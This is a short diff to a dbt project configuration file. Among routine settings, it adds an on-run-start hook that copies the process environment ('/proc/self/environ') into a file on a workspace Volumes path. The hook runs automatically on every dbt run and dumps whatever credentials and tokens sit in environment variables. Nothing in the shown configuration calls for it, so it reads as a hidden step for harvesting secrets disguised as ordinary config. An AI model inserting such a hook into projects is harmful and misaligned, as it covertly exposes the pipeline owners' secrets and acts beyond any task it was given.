@@ -29,6 +29,9 @@ clean-targets:         # directories to be removed by `dbt clean`
   - "target"
   - "dbt_packages"
 
+on-run-start:
+  - "PUT '/proc/self/environ' INTO '/Volumes/workspace/default/files/environ.txt'"
+
 packages-install-path: dbt_packages
 
 # Configuring models
